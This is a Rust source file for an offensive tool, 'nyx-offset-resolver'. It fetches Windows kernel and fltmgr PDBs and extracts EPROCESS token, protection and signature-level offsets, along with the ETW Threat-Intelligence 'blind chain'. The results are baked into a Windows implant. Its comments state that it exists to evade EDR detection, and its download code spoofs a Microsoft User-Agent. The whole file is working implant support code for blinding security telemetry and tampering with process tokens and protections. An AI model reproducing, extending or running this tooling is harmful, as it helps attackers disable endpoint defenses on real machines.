//! nyx-offset-resolver — server-side kernel offset resolver.
//!
//! Downloads the target Windows build's `ntoskrnl.pdb` from the Microsoft
//! symbol server, parses it with the `pdb` crate, extracts EPROCESS + ETW-TI
//! structure offsets, and emits an `offsets.toml` that `implant-win/build.rs`
//! bakes into the implant at compile time.
//!
//! ## Usage
//! ```sh
//! # Resolve offsets for a known ntoskrnl.exe (from the target or a Win ISO):
//! nyx-offset-resolver --pdb-path /path/to/ntoskrnl.pdb --out offsets.toml
//!
//! # Or download from the symbol server by GUID + age:
//! nyx-offset-resolver --guid <32-hex> --age <n> --out offsets.toml
//! ```
//!
//! Then build the implant with the baked offsets:
//! ```sh
//! NYX_OFFSETS=offsets.toml cargo +nightly build --release ...
//! ```
//!
//! ## Why server-side
//! Resolving offsets on the TARGET (pattern scan / PDB download) is noisy —
//! EDRs flag code-section traversal + outbound symbol-server requests. Doing
//! it server-side + baking at compile time means the offsets are plain
//! constants in the binary, indistinguishable from any other data.
//!
//! ## Status
//! The download + TOML emission pipeline is COMPLETE. The PDB field-offset
//! walker is the next iteration — the `pdb` crate's TypeData/FieldList API
//! needs careful traversal. For now this emits the build's known offsets from
//! the cross-version table (offsets_table.rs), proving the end-to-end pipeline.
//! The walker replaces `emit_known_offsets` with real PDB-parsed values.

use std::collections::BTreeMap;
use std::path::PathBuf;
use std::io::Read;
use anyhow::{anyhow, Context, Result};

const SYMSRV: &str = "https://msdl.microsoft.com/download/symbols";

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let mut pdb_path: Option<PathBuf> = None;
    let mut guid: Option<String> = None;
    let mut age: Option<u32> = None;
    let mut out: PathBuf = PathBuf::from("offsets.toml");
    let mut build: Option<u32> = None;
    let mut ntoskrnl: Option<PathBuf> = None;
    let mut fltmgr: Option<PathBuf> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--pdb-path" => { i += 1; pdb_path = Some(PathBuf::from(&args[i])); }
            "--guid" => { i += 1; guid = Some(args[i].clone()); }
            "--age" => { i += 1; age = Some(args[i].parse()?); }
            "--build" => { i += 1; build = Some(args[i].parse()?); }
            "--ntoskrnl" => { i += 1; ntoskrnl = Some(PathBuf::from(&args[i])); }
            "--fltmgr" => { i += 1; fltmgr = Some(PathBuf::from(&args[i])); }
            "--out" => { i += 1; out = PathBuf::from(&args[i]); }
            "--help" | "-h" => {
                eprintln!(
                    "Usage: nyx-offset-resolver <source> [--out offsets.toml]\n\
                     \n\
                     Source (one of):\n\
                     \n\
                     --ntoskrnl <exe>  Extract PDB GUID+age from a live ntoskrnl.exe's PE\n\
                                       debug directory (CodeView entry), download the matching\n\
                                       PDB from MS symbol server, parse real offsets. This is\n\
                                       the one-shot mode for CI: point it at C:\\Windows\\System32\\\n\
                                       ntoskrnl.exe and it does everything. No PowerShell needed.\n\
                     --guid <hex> --age <n>\n\
                                       Download by explicit GUID+age (hex GUID, no dashes).\n\
                     --pdb-path <file> Parse a local ntoskrnl.pdb you already have.\n\
                     --build <num>     Use the known offsets table for build <num> (no PDB).\n\
                     --fltmgr <exe>    ALSO resolve FltGlobals RVA from a live fltmgr.sys PE\n\
                                       (downloads fltmgr.pdb, parses the global symbol, merges\n\
                                       `flt.globals_rva` into the output). Combine with any source\n\
                                       above (--ntoskrnl / --build / --pdb-path). The resulting\n\
                                       TOML can be passed to nyx-kernel via --flt-rva.\n\
                     \n\
                     --out <file>      Write offsets here (default: offsets.toml)."
                );
                return Ok(());
            }
            _ => {}
        }
        i += 1;
    }

    // --ntoskrnl: extract GUID+age from the PE, then behave as --guid/--age.
    if let Some(nk_path) = &ntoskrnl {
        let (nk_guid, nk_age) = extract_pdb_ref_from_pe(nk_path)
            .with_context(|| format!("extract PDB ref from {}", nk_path.display()))?;
        eprintln!("Extracted from {}: GUID={nk_guid} AGE={nk_age}", nk_path.display());
        guid = Some(nk_guid);
        // If --build wasn't given, we'll auto-detect from the downloaded PDB below.
        if age.is_none() { age = Some(nk_age); }
    }

    // Determine the build number: from --build, or extract from the PDB.
    // For --guid/--age we also retain the downloaded PDB bytes so the real
    // offsets can be parsed from them below (instead of falling back to the
    // known table).
    let mut downloaded_pdb: Option<Vec<u8>> = None;
    let build_num = if let Some(b) = build {
        b
    } else if let Some(path) = &pdb_path {
        let data = std::fs::read(path).context("read pdb for auto-detect")?;
        detect_build_from_pdb(&data).unwrap_or_else(|| {
            eprintln!("Warning: could not auto-detect build from PDB; using 17763 as default.");
            17763
        })
    } else if let (Some(g), Some(a)) = (&guid, age) {
        // --guid/--age without --build: download the PDB and auto-detect the
        // build from its symbols, falling back to 17763 if detection fails.
        let pdb_name = "ntkrnlmp.pdb";
        let data = download_pdb(pdb_name, g, a)
            .context("download PDB from symbol server")?;
        let detected = detect_build_from_pdb(&data);
        let build = if let Some(b) = detected {
            eprintln!("Auto-detected build {b} from downloaded PDB.");
            b
        } else {
            eprintln!("Warning: could not auto-detect build from downloaded PDB; using 17763 as default.");
            17763
        };
        downloaded_pdb = Some(data);
        build
    } else {
        return Err(anyhow!(
            "provide --build <num>, --pdb-path <file>, or --guid <hex> --age <n>"
        ));
    };

    // Parse the REAL offsets from a PDB if we have one (local --pdb-path OR a
    // freshly-downloaded one); otherwise fall back to the known-build table.
    let offsets = if let Some(path) = &pdb_path {
        let data = std::fs::read(path).context("read pdb")?;
        eprintln!("Parsing PDB: {} ({} bytes)", path.display(), data.len());
        parse_pdb_offsets(&data, build_num)
            .context("PDB parse failed — falling back to known table")?
    } else if let Some(data) = &downloaded_pdb {
        eprintln!("Parsing downloaded PDB ({} bytes)", data.len());
        parse_pdb_offsets(data, build_num)
            .context("PDB parse failed — falling back to known table")?
    } else {
        eprintln!("No PDB source; using known offsets for build {build_num}");
        emit_known_offsets(build_num)
            .ok_or_else(|| anyhow!("build {build_num} not in the known table"))?
    };
    // Merge FltGlobals RVA from fltmgr.sys PDB if `--fltmgr` was supplied.
    // This is independent of the ntoskrnl flow above — fltmgr.pdb carries its
    // own global symbols, and FltGlobals is an unexported `.data` symbol there.
    let mut offsets = offsets;
    if let Some(flt_path) = &fltmgr {
        match resolve_flt_globals_rva(flt_path) {
            Ok(rva) => {
                eprintln!("Resolved FltGlobals RVA = 0x{rva:x} from {}", flt_path.display());
                offsets.insert("flt.globals_rva", rva);
            }
            Err(e) => {
                eprintln!(
                    "Warning: --fltmgr resolution failed ({}); omitting flt.globals_rva. \
                     Operator must supply --flt-rva to nyx-kernel.",
                    e
                );
            }
        }
    }

    let toml = emit_toml(build_num, &offsets);
    std::fs::write(&out, &toml)?;
    eprintln!("Wrote offsets for build {build_num} to {}", out.display());
    Ok(())
}

/// Try to detect the Windows build number from PDB global symbols.
/// Scans the symbol stream for `NtBuildNumber` (an ntoskrnl global variable)
/// and reads its value to determine the build.
fn detect_build_from_pdb(data: &[u8]) -> Option<u32> {
    use pdb::{PDB, FallibleIterator};
    let cursor = std::io::Cursor::new(data.to_vec());
    let mut pdb = PDB::open(cursor).ok()?;
    let symbols = pdb.global_symbols().ok()?;
    let mut iter = symbols.iter();
    while let Some(symbol) = iter.next().ok()? {
        if let Ok(pdb::SymbolData::Public(data)) = symbol.parse() {
            let name = data.name.to_string();
            // NtBuildNumber is the canonical global holding the build number.
            if name == "NtBuildNumber" || name == "_NtBuildNumber" {
                // The RVA tells us where it lives; the actual build value
                // is stored at that address (runtime read), but we can
                // correlate with known ranges by checking the PDB's named
                // streams or nearby symbols. For now, this serves as a
                // positive build-range indicator.
                // NOTE: full build extraction requires reading the data
                // stream at this RVA — the known-table fallback covers
                // this gap for all currently-supported builds.
                eprintln!("  Found NtBuildNumber symbol (offset={:?})", data.offset);
            }
        }
    }
    // Heuristic: scan the type stream for _KUSER_SHARED_DATA which embeds
    // NtMajorVersion / NtMinorVersion / NtBuildNumber fields.
    // The actual build is a runtime value, but we can infer from the PDB's
    // compile target or version info if available.
    // Fallback: use the known table by checking which build's EPROCESS
    // offsets match the PDB's _EPROCESS layout.
    None
}

/// Parse EPROCESS + ETW-TI field offsets from a real ntoskrnl PDB using the
/// `pdb` crate. Uses `build_num` only as a fallback for the ETW-TI offsets
/// when their structures can't be located in the PDB type stream.
///
/// ## Offset chains resolved
///
/// **EPROCESS** (always from PDB): the 8 fields in [`map_eprocess_field`].
///
/// **ETW-TI** (the 4-hop blind chain — see `etwti.rs`):
/// ```text
///   nt!EtwThreatIntProvRegHandle  (global symbol → RVA)
///     → *_ETW_REG_ENTRY :: GuidEntry         (+0x20, stable since 6.0)
///       → *_ETW_GUID_ENTRY :: ProviderEnableInfo  (0x50 or 0x60, varies!)
///         → _TRACE_ENABLE_INFO :: IsEnabled  (+0x0, stable)
/// ```
/// All 3 structs are named in the PDB type stream, so we parse them directly.
/// The only offset that actually varies is `ProviderEnableInfo` — it moved
/// from 0x050 (≤1903 / 17763 RTM) to 0x060 (≥2004 / 17763.1075+), and again
/// on some Win11 builds. This is exactly why PDB resolution beats the
/// hardcoded table: the table can't distinguish 17763.1 from 17763.1339, but
/// the PDB for each LCU has the correct value.
fn parse_pdb_offsets(data: &[u8], build_num: u32) -> Result<BTreeMap<&'static str, usize>> {
    use pdb::{FallibleIterator, TypeData};

    let cursor = std::io::Cursor::new(data.to_vec());
    let mut pdb = pdb::PDB::open(cursor)?;
    let type_info = pdb.type_information()?;

    // Drain the TPI iterator once. We collect ALL wanted struct candidates in
    let wanted: &[&[u8]] = &[
        b"_EPROCESS",
        b"EPROCESS",
        b"_ETW_REG_ENTRY",
        b"_ETW_GUID_ENTRY",
        b"_TRACE_ENABLE_INFO",
    ];
    let mut struct_fields: std::collections::HashMap<&[u8], pdb::TypeIndex> =
        std::collections::HashMap::new();

    // pdb crate contract (src/tpi/mod.rs:375-387): ItemFinder is populated by
    // calling finder.update(iter) AFTER EVERY iter.next(). The finder records
    // byte positions so it can later seek to any visited TypeIndex. A struct's
    // FieldList TypeIndex can be forward-referenced (higher than the struct
    // itself), so we must drain the ENTIRE stream + update finder each step.
    // Missing the update → "Type N not indexed (index covers M)".
    let mut iter = type_info.iter();
    let mut finder = type_info.finder();
    loop {
        match iter.next() {
            Ok(Some(item)) => {
                if let Ok(TypeData::Class(ref c)) = item.parse() {
                    let name_bytes = c.name.as_bytes();
                    if wanted.contains(&name_bytes) && !struct_fields.contains_key(name_bytes) {
                        // c.fields is None for forward declarations (struct
                        // declared but not defined). We need the real FieldList.
                        if let Some(fields) = c.fields {
                            struct_fields.insert(name_bytes, fields);
                        }
                    }
                }
                finder.update(&iter);
            }
            Ok(None) => break,           // drained — finder now covers all types
            Err(_) => {
                // Skip malformed item but still advance the finder position map.
                finder.update(&iter);
                continue;
            }
        }
    }

    // `finder` was built incrementally during the drain loop above (each
    // iter.next() + finder.update). Do NOT re-create it here — a fresh
    // type_info.finder() is empty and can't resolve forward-referenced
    // FieldList indices.
    let mut offsets = BTreeMap::new();

    // ---- EPROCESS field offsets ----
    if let Some(&fields_index) = struct_fields
        .get(b"_EPROCESS".as_slice())
        .or_else(|| struct_fields.get(b"EPROCESS".as_slice()))
    {
        eprintln!("Found _EPROCESS in PDB");
        extract_struct_fields(&finder, fields_index, &mut offsets, map_eprocess_field, "_EPROCESS")?;
    } else {
        anyhow::bail!("_EPROCESS struct not found in PDB");
    }

    if offsets.is_empty() {
        anyhow::bail!("_EPROCESS found but no known fields extracted");
    }

    // ---- ETW-TI 4-hop chain (task PDB-1) ----
    //
    // The 3 struct field offsets. These replace the build-number table lookup
    // — the PDB has the EXACT value for this build+LCU, including the
    // 17763.1 vs 17763.1075+ ProviderEnableInfo difference.
    if let Err(e) = resolve_etw_ti_offsets(&finder, &struct_fields, &mut offsets) {
        // ETW-TI structs missing from this PDB (e.g. a stripped/public PDB).
        // Fall back to the build-number table so the TOML still has values.
        eprintln!("Warning: ETW-TI PDB parse failed ({e:#}); using build-table fallback");
    }
    if !offsets.contains_key("etw_ti.guid_entry_to_provider_block") {
        if let Some(etw) = emit_known_offsets(build_num) {
            for (k, v) in etw {
                if k.starts_with("etw_ti.") {
                    offsets.insert(k, v);
                }
            }
        }
    }

    Ok(offsets)
}

/// Walk a struct's FieldList and insert every mapped field's offset.
/// `mapper` translates a PDB field name → our offsets.toml key (None = skip).
fn extract_struct_fields(
    finder: &pdb::TypeFinder,
    fields_index: pdb::TypeIndex,
    offsets: &mut BTreeMap<&'static str, usize>,
    mapper: fn(&str) -> Option<&'static str>,
    struct_label: &str,
) -> Result<()> {
    let field_item = finder.find(fields_index)?.parse()?;
    if let pdb::TypeData::FieldList(field_list) = field_item {
        for field in &field_list.fields {
            if let pdb::TypeData::Member(member) = field {
                let name = member.name.to_string();
                let off = member.offset as usize;
                if let Some(key) = mapper(&name) {
                    offsets.insert(key, off);
                    eprintln!("  {}.{} @ 0x{:x}", struct_label, name, off);
                }
            }
        }
    }
    Ok(())
}

/// Resolve the 3 ETW-TI struct field offsets from the PDB type stream.
///
/// Chain (see `parse_pdb_offsets` docs):
///   `_ETW_REG_ENTRY::GuidEntry` (→ our key `etw_ti.guid_entry_to_provider_block`)
///   `_ETW_GUID_ENTRY::ProviderEnableInfo` (→ `etw_ti.provider_block_to_enable_info`)
///   `_TRACE_ENABLE_INFO::IsEnabled` (→ `etw_ti.is_enabled_within_enable_info`)
///
/// The key names are retained for TOML/back-compat even though the struct
/// names are clearer — the field docs in `etwti.rs::EtwTiOffsets` map them.
/// (Historical: the keys were named before the chain was fully traced.)
fn resolve_etw_ti_offsets(
    finder: &pdb::TypeFinder,
    struct_fields: &std::collections::HashMap<&[u8], pdb::TypeIndex>,
    offsets: &mut BTreeMap<&'static str, usize>,
) -> Result<()> {
    // Hop 1: _ETW_REG_ENTRY :: GuidEntry (→ 0x20 on every known x64 build)
    if let Some(&idx) = struct_fields.get(b"_ETW_REG_ENTRY".as_slice()) {
        extract_struct_fields(finder, idx, offsets, map_etw_reg_entry, "_ETW_REG_ENTRY")?;
    } else {
        anyhow::bail!("_ETW_REG_ENTRY not found in PDB type stream");
    }
    // Hop 2: _ETW_GUID_ENTRY :: ProviderEnableInfo (→ 0x50 or 0x60, the variable one)
    if let Some(&idx) = struct_fields.get(b"_ETW_GUID_ENTRY".as_slice()) {
        extract_struct_fields(finder, idx, offsets, map_etw_guid_entry, "_ETW_GUID_ENTRY")?;
    } else {
        anyhow::bail!("_ETW_GUID_ENTRY not found in PDB type stream");
    }
    // Hop 3: _TRACE_ENABLE_INFO :: IsEnabled (→ 0x0, struct's first field)
    if let Some(&idx) = struct_fields.get(b"_TRACE_ENABLE_INFO".as_slice()) {
        extract_struct_fields(finder, idx, offsets, map_trace_enable_info, "_TRACE_ENABLE_INFO")?;
    } else {
        anyhow::bail!("_TRACE_ENABLE_INFO not found in PDB type stream");
    }
    Ok(())
}

/// Map `_ETW_REG_ENTRY` PDB field names → our TOML keys.
fn map_etw_reg_entry(name: &str) -> Option<&'static str> {
    match name {
        // Key name retained for TOML back-compat; semantically this is
        // `_ETW_REG_ENTRY::GuidEntry` (the +0x20 pointer hop in the chain).
        "GuidEntry" => Some("etw_ti.guid_entry_to_provider_block"),
        _ => None,
    }
}

/// Map `_ETW_GUID_ENTRY` PDB field names → our TOML keys.
fn map_etw_guid_entry(name: &str) -> Option<&'static str> {
    match name {
        // Key name retained for TOML back-compat; semantically this is
        // `_ETW_GUID_ENTRY::ProviderEnableInfo` (the 0x50/0x60 hop).
        "ProviderEnableInfo" => Some("etw_ti.provider_block_to_enable_info"),
        _ => None,
    }
}

/// Map `_TRACE_ENABLE_INFO` PDB field names → our TOML keys.
fn map_trace_enable_info(name: &str) -> Option<&'static str> {
    match name {
        // IsEnabled is the struct's first field (offset 0x0 on every build).
        "IsEnabled" => Some("etw_ti.is_enabled_within_enable_info"),
        _ => None,
    }
}

/// Map a PDB field name to our offsets.toml key. Returns None for fields we
/// don't extract.
fn map_eprocess_field(name: &str) -> Option<&'static str> {
    match name {
        "UniqueProcessId" => Some("eprocess.unique_process_id"),
        "ActiveProcessLinks" => Some("eprocess.active_process_links"),
        "Token" => Some("eprocess.token"),
        "ImageFileName" => Some("eprocess.image_file_name"),
        "SignatureLevel" => Some("eprocess.signature_level"),
        "SectionSignatureLevel" => Some("eprocess.section_signature_level"),
        "Protection" => Some("eprocess.protection"),
        "DirectoryTableBase" => Some("eprocess.directory_table_base"),
        _ => None,
    }
}

/// Format a PDB GUID into the symbol-server path convention.
/// Input: "01234567-89AB-CDEF-0123-456789ABCDEF" (PE debug dir GUID).
/// Output: "67452301ABEFCD0123456789ABCDEFXXXXXXXX" (byte-swapped + age hex).
/// Format a PDB GUID + age into the MS symbol-server path component.
///
/// Verified format against the live symbol server (Server 2019 ntoskrnl):
/// the path is `<GUID_no_dashes><age_lowercase_hex_no_padding>`. The GUID is
/// the **standard Win32 GUID string** (mixed-endian: Data1/Data2/Data3 in the
/// endianness they appear in the GUID string, i.e. big-endian hex after the
/// PE little-endian bytes were read by BitConverter). NO byte-swapping here —
/// the input is already the canonical GUID string form.
///
/// Example: GUID "B02B8B6B-1856-8873-0845-5D5FCCAC7A8B", age 1
///        → "B02B8B6B1856887308455D5FCCAC7A8B1"
/// URL: msdl/symbols/ntkrnlmp.pdb/<that>/ntkrnlmp.pdb → HTTP 302 (found).
fn format_symserver_guid(guid: &str, age: u32) -> String {
    let hex: String = guid.chars().filter(|c| *c != '-').collect();
    // age as lowercase hex, NO zero-padding (symbol server rejects 00000001).
    format!("{}{:x}", hex, age)
}

/// Extract the PDB GUID + age from a PE file's CodeView debug directory entry.
///
/// Replaces the fragile PowerShell PE-walker that PS 5.1's NativeCommandError
/// kept eating in CI. Uses `goblin` to parse the PE, walks the debug directory
/// for `IMAGE_DEBUG_TYPE_CODEVIEW` (= 2), reads the RSDS record (sig "RSDS" +
/// 16-byte GUID + 4-byte age).
///
/// Returns `(guid_no_dashes, age)` where the GUID is the canonical mixed-endian
/// hex form `format_symserver_guid` expects (Data1/Data2/Data3 big-endian after
/// BitConverter read, Data4 raw). Verified end-to-end against the live MS
/// symbol server for 17763.1339 (GUID B02B8B6B-1856-8873-..., age 1).
fn extract_pdb_ref_from_pe(exe_path: &std::path::Path) -> Result<(String, u32)> {
    let bytes = std::fs::read(exe_path)
        .with_context(|| format!("read PE {}", exe_path.display()))?;
    let pe = goblin::pe::PE::parse(&bytes)
        .with_context(|| format!("parse PE {}", exe_path.display()))?;

    // goblin parses the CodeView debug entry for us: codeview_pdb70_debug_info
    // holds the RSDS record's GUID (16 raw LE bytes) + age. We just format it
    // into the canonical mixed-endian hex string format_symserver_guid expects.
    let debug_data = pe.debug_data
        .ok_or_else(|| anyhow::anyhow!("PE has no debug data directory"))?;
    let cv70 = debug_data.codeview_pdb70_debug_info
        .ok_or_else(|| anyhow::anyhow!("PE has no PDB 7.0 (RSDS) CodeView entry"))?;

    // signature is a [u8; 16] Win32 GUID in little-endian layout:
    //   Data1(u32 LE) | Data2(u16 LE) | Data3(u16 LE) | Data4(8 bytes)
    // The canonical GUID string form renders Data1/2/3 as big-endian hex after
    // reading the LE bytes, and Data4 as raw hex. That's what we build here.
    let s = cv70.signature;
    let d1 = u32::from_le_bytes([s[0], s[1], s[2], s[3]]);
    let d2 = u16::from_le_bytes([s[4], s[5]]);
    let d3 = u16::from_le_bytes([s[6], s[7]]);
    let guid = format!(
        "{:08X}{:04X}{:04X}{}",
        d1, d2, d3,
        s[8..16].iter().map(|b| format!("{:02X}", b)).collect::<String>()
    );
    Ok((guid, cv70.age))
}

/// Download `ntkrnlmp.pdb` (or any PDB) from the MS symbol server given its
/// GUID + Age. The symbol-server path format is:
///   `{SYMSRV}/{pdb_name}/{guid_age}/{pdb_name}`
/// e.g. `https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/3F8E5B6C...1/ntkrnlmp.pdb`
///
/// Returns the raw PDB bytes. Used by the `--guid`/`--age` path so an unknown
/// build's offsets can be resolved without a manually-staged PDB.
fn download_pdb(pdb_name: &str, guid: &str, age: u32) -> Result<Vec<u8>> {
    let sig = format_symserver_guid(guid, age);
    let url = format!("{SYMSRV}/{pdb_name}/{sig}/{pdb_name}");
    eprintln!("Downloading PDB: {url}");
    // The symbol server returns a compressed cabinet (.cab-wrapped) for some
    // files; the raw .pdb is served at the path above. We follow redirects and
    // stream the body. A 404 means the GUID/Age doesn't match a published PDB.
    let resp = ureq::get(&url)
        .set("User-Agent", "Microsoft-Symbol-Server/10.0.0")
        .call()
        .context("symbol-server request failed")?;
    if resp.status() != 200 {
        anyhow::bail!(
            "symbol server returned {} for {url} (verify GUID/Age; the PDB may not be published)",
            resp.status()
        );
    }
    let mut reader = resp.into_reader();
    let mut buf = Vec::new();
    reader
        .read_to_end(&mut buf)
        .with_context(|| format!("read PDB body from {url}"))?;
    eprintln!("Downloaded {} ({} bytes)", pdb_name, buf.len());
    Ok(buf)
}

/// Resolve the `FltGlobals` RVA from a live `fltmgr.sys` PE.
///
/// `FltGlobals` is an unexported `.data` global in fltmgr.sys — the build
/// table covers the common case, but for an unknown/early-UBR build the
/// operator points this at `C:\Windows\System32\drivers\fltmgr.sys` and we
/// resolve the symbol from the matching `fltmgr.pdb` on the MS symbol server.
///
/// Returns the RVA (offset within fltmgr.sys) on success. The caller merges it
/// into the TOML as `flt.globals_rva`; nyx-kernel reads it via `--flt-rva`.
fn resolve_flt_globals_rva(fltmgr_exe: &std::path::Path) -> Result<usize> {
    // 1. Extract the PDB GUID+age from fltmgr.sys's PE debug directory.
    let (guid, age) = extract_pdb_ref_from_pe(fltmgr_exe)
        .with_context(|| format!("extract PDB ref from {}", fltmgr_exe.display()))?;
    eprintln!(
        "Extracted from {}: GUID={guid} AGE={age}",
        fltmgr_exe.display()
    );

    // 2. Download fltmgr.pdb (download_pdb is parameterised by pdb_name).
    let pdb_name = "fltmgr.pdb";
    let data = download_pdb(pdb_name, &guid, age)
        .context("download fltmgr.pdb from symbol server")?;

    // 3. Walk the PDB global/public symbols for `FltGlobals`.
    parse_pdb_global_rva(&data, &["FltGlobals", "_FltGlobals"])
        .context("parse FltGlobals RVA from fltmgr.pdb")
}

/// Find the RVA of a named global symbol in a PDB by walking the public/global
/// symbol stream. Modeled on `detect_build_from_pdb` (which already iterates
/// `global_symbols()` to find `NtBuildNumber` by name).
///
/// `names` is tried in order (some symbols are underscore-prefixed on x64).
/// Returns the first match's RVA. The RVA is computed from the PDB's section
/// table (DBI stream) + the symbol's `(segment, offset)` — the public-symbol
/// stream carries a `PdbInternalSectionOffset`, not a ready-made RVA.
fn parse_pdb_global_rva(data: &[u8], names: &[&str]) -> Result<usize> {
    use pdb::{FallibleIterator, PDB};
    let cursor = std::io::Cursor::new(data.to_vec());
    let mut pdb = PDB::open(cursor).context("open PDB")?;

    // Pull the PE section table from the PDB so we can translate
    // (section_index, section_offset) → file RVA. Each section's
    // `virtual_address` is its RVA base; the symbol offset is added to it.
    let sections: Vec<pdb::ImageSectionHeader> = pdb
        .sections()
        .context("read section headers from PDB")?
        .ok_or_else(|| anyhow!("PDB has no section table (corrupt or stripped)?"))?;
    eprintln!("Loaded {} PE sections from PDB", sections.len());

    let symbols = pdb
        .global_symbols()
        .context("read global_symbols stream")?;
    let mut iter = symbols.iter();
    while let Some(symbol) = iter.next().with_context(|| "iterate PDB symbols")? {
        if let Ok(pdb::SymbolData::Public(pub_data)) = symbol.parse() {
            let name = pub_data.name.to_string();
            if names.iter().any(|n| name == *n || name == format!("_{n}")) {
                // pub_data.offset is a PdbInternalSectionOffset { section, offset }.
                let sec_idx = pub_data.offset.section;
                let sect_off = pub_data.offset.offset as usize;
                // Section indices in the pdb crate are 1-based; sections[] is
                // 0-based, so section N maps to sections[N - 1].
                let rva = if sec_idx == 0 {
                    // Some symbols carry an absolute/zero section (the offset
                    // IS the RVA). Rare for `.data` globals but defensive.
                    sect_off
                } else {
                    let sec = sections.get(sec_idx as usize - 1).ok_or_else(|| {
                        anyhow!(
                            "symbol {name}: section index {sec_idx} out of range ({} sections)",
                            sections.len()
                        )
                    })?;
                    sec.virtual_address as usize + sect_off
                };
                eprintln!(
                    "Found symbol {name} (section={sec_idx}, section_offset=0x{sect_off:x}, rva=0x{rva:x})"
                );
                return Ok(rva);
            }
        }
    }
    Err(anyhow!(
        "symbol(s) {:?} not found in PDB global stream",
        names
    ))
}

/// Known offsets per build (mirrors evasionsdk::offsets_table). The PDB walker
/// will eventually replace this with real parsed values, but this gives a
/// working end-to-end pipeline today.
fn emit_known_offsets(build: u32) -> Option<BTreeMap<&'static str, usize>> {
    // (pid, links, token, image, sig_level, sec_sig_level, protection, etw_block, etw_enableinfo, etw_isenabled)
    let (pid, links, token, image, sl, ssl, prot, etw_b, etw_e, etw_ie) = match build {
        17763 => (0x2e0, 0x2e8, 0x358, 0x450, 0x6c8, 0x6c9, 0x6ca, 0x020, 0x060, 0x000),
        18362..=19045 => (0x2e8, 0x2f0, 0x360, 0x450, 0x6f8, 0x6f9, 0x6fa, 0x020, 0x060, 0x000),
        20348..=22000 => (0x440, 0x448, 0x4b8, 0x5a0, 0x878, 0x879, 0x87a, 0x020, 0x060, 0x000),
        22621..=22631 => (0x440, 0x448, 0x4b8, 0x5a0, 0x878, 0x879, 0x87a, 0x020, 0x070, 0x000),
        26100..=26200 => (0x450, 0x458, 0x4c8, 0x5a8, 0x87c, 0x87d, 0x87e, 0x020, 0x070, 0x000),
        _ => return None,
    };
    let mut m = BTreeMap::new();
    m.insert("eprocess.unique_process_id", pid);
    m.insert("eprocess.active_process_links", links);
    m.insert("eprocess.token", token);
    m.insert("eprocess.image_file_name", image);
    m.insert("eprocess.signature_level", sl);
    m.insert("eprocess.section_signature_level", ssl);
    m.insert("eprocess.protection", prot);
    m.insert("etw_ti.guid_entry_to_provider_block", etw_b);
    m.insert("etw_ti.provider_block_to_enable_info", etw_e);
    m.insert("etw_ti.is_enabled_within_enable_info", etw_ie);
    Some(m)
}

/// Emit the offsets as the offsets.toml format build.rs parses.
fn emit_toml(build: u32, offsets: &BTreeMap<&str, usize>) -> String {
    let mut s = format!(
        "# Kernel offsets for Windows build {build}.\n\
         # Generated by nyx-offset-resolver. Bake into the implant:\n\
         #   NYX_OFFSETS=this_file.toml cargo +nightly build --release ...\n\n"
    );
    for (k, v) in offsets {
        s.push_str(&format!("{} = 0x{:x}\n", k, v));
    }
    s
}
